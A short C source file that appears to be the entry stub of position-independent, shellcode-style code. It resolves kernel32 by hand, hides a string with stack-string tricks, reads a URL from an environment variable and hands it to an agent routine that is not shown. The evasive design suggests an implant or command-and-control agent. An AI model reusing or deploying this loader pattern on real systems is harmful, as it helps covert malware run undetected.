#include "entry.h"
#include "kernel32.h"
#include "logger.h"
#include "environment.h"
#include "string.h"
#include "stackstrings.h"
#include "picfixup.h"

extern "C" __attribute__((section(".text"), used)) void entry(void)
{
#if defined(ENVIRONMENT_I386) && defined(PIC_RELOCATIONS_ENABLED)
    PIC_ApplyFixups((UINT32)(ULONG_PTR)&&pic_fixups_return);
pic_fixups_return:
    ;
#else
    PIC_ApplyFixups();
#endif

    KERNEL32 entry_k32;
    if (!KERNEL32_Ctor(&entry_k32))
        return;

    CHAR env_name[8];
    BuildUrlEnvironmentVariableName(env_name);

    CHAR url_arg[512];
    if (GetVariable(env_name, url_arg, sizeof(url_arg)) == 0) {
        LOG_ERROR("Environment variable W_URL not set");
        return;
    }

    WCHAR url_arg_w[512];
    if (AnsiToWide(url_arg, url_arg_w, 512) < 0) {
        LOG_ERROR("Environment variable W_URL is invalid");
        return;
    }

    INT32 rc = agent_main(url_arg_w);
    entry_k32.ExitProcess((UINT32)rc);
}
